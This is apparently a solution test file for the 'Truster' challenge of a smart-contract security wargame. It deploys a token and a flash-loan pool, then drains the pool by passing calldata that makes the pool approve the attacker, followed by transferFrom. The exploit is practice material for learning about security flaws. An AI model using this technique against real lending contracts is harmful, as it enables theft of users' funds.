const { ether } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');

const { expect } = require('chai');

describe('[Challenge] Truster', function() {
	const [ deployer, attacker, ...otherAccounts ] = accounts;

	const TOKENS_IN_POOL = ether('1000000');

	before(async function() {
		/** SETUP SCENARIO */
		this.token = await DamnValuableToken.new({ from: deployer });
		this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });
		//Send constant tokens to token pool.
		await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
		// lenderpool equal to token pool.
		expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(TOKENS_IN_POOL);
		// Attacker token balance is 0.
		expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal('0');
	});

	it('Exploit', async function() {
		/** YOUR EXPLOIT GOES HERE     */
		//get token balance of address pool.
		const amount = await this.token.balanceOf(this.pool.address);
		//Call from attacker. with 0 borrow Ammount , borrower = 0x00001,
		/*         * flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )*/
		await this.pool.flashLoan(
			0, // borrowAmount
			'0x0000000000000000000000000000000000000001', // borrower
			this.token.address, //target
			this.token.contract.methods.approve(attacker, amount.toString()).encodeABI(), //data
			{ from: attacker }
		);
		// let pool approve attacker to spend amount. when flashloanPool call data.

		// User transfer from to take away pool leder tokens through previous approve.
		await this.token.transferFrom(this.pool.address, attacker, amount.toString(), { from: attacker });
		// Risk . Attacker use lenderPool Contract to executed approve. User receiver to prevent this.
	});

	after(async function() {
		/** SUCCESS CONDITIONS */
		// attakce token balance == token in pool.
		expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(TOKENS_IN_POOL);
		// lender balance is empty.
		expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal('0');
	});
});
